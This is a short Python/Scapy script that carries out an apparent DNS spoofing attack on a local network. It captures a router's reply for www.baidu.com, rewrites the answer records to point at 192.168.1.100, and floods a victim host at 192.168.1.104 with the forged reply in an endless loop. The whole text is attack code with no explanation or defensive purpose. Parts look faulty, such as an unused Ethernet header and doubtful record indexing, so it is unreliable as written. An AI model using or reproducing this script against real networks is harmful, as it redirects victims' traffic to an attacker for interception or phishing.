from scapy.all import *
e = Ether(dst="f0:eb:d0:0b:11:48", src="8c:a9:82:29:2d:6e")
packet = (IP(src="192.168.1.100",dst="192.168.1.1")/UDP(sport=RandShort())/DNS(id=1,rd=1,tc=1,ra=1,z=1,qdcount=1,ancount=1,nscount=1,qd=DNSQR(qname="www.baidu.com",qtype="A",qclass="IN")))
res = sr1(packet)

res[DNS].an[DNSRR][1].rdata='192.168.1.100'
res[DNS].an[DNSRR][2].rdata='192.168.1.100'

res[IP].dst="192.168.1.104"


res.show()
while 1:
	sendp(res)